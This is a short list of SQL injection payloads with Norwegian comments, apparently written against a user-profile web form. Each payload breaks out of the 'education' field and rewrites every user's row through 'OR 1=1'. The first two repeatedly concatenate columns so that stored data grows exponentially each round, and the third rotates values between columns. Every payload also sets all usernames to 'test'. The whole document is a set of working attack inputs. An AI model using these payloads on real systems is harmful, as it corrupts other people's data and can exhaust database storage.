...
# Denne fyller alle brukeres kolonner med den seg selv, dv kvadrerer innholdet pr runde m^k * n = 2^k * n
INPUT_education', username= 'test', first_name= first_name || first_name, last_name= last_name || last_name, password= password, education= education || education, employment= employment || employment, music= music || music, movie= movie || movie, nationality= nationality || nationality, birthday= birthday WHERE username='' OR 1=1;/*

# Denne fyller alle brukeres kolonner med den seg selv, dv kvadrerer innholdet pr runde m^k * n = 5^k * n
INPUT_education', username= 'test', first_name= first_name || first_name || first_name || first_name || first_name, last_name= last_name || last_name || last_name || last_name || last_name, password= password, education= education || education || education || education || education, employment= employment || employment || employment || employment || employment, music= music || music || music || music || music, movie= movie || movie || movie || movie || movie, nationality= nationality || nationality || nationality || nationality || nationality, birthday= birthday WHERE username='' OR 1=1;/*

# Denne roterer kolonnene
INPUT_education', username= 'test', first_name= first_name, last_name= first_name, password= password, education= last_name, employment= education, music= employment, movie= music, nationality= movie, birthday= nationality WHERE username='' OR 1=1;/*